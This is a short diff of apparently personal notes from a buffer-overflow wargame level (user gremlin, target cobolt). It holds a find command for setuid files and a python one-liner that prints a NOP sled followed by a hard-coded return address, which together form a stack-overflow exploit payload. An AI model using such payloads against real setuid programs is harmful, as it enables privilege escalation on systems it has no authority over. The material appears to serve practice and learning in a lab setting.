@@ -1,2 +1,9 @@
 [gremlin@localhost gremlin]$ find / -user cobolt \( -perm -u+s -o -perm -g+s \) 2>/dev/null
 /home/gremlin/cobolt
+
+shellcode = 0xbffffa69
+payload = 20 + ret
+
+##################################################################
+`python -c 'print "\x90"*20 + "\x69\xfa\xff\xbf"'`
+#################################################################
